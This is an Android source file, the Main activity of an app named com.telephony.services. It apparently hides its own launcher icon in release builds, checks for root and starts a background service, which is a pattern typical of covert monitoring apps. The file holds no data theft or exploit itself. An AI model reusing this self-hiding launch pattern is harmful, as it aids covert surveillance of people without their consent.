package com.telephony.services;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;

public class Main extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Utils.setComponentState(this, Main.class, BuildConfig.DEBUG);
        Utils.checkRoot();
        Intent mi = new Intent(this, StartService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(mi);
        } else {
            startService(mi);
        }

        finish();
    }

}
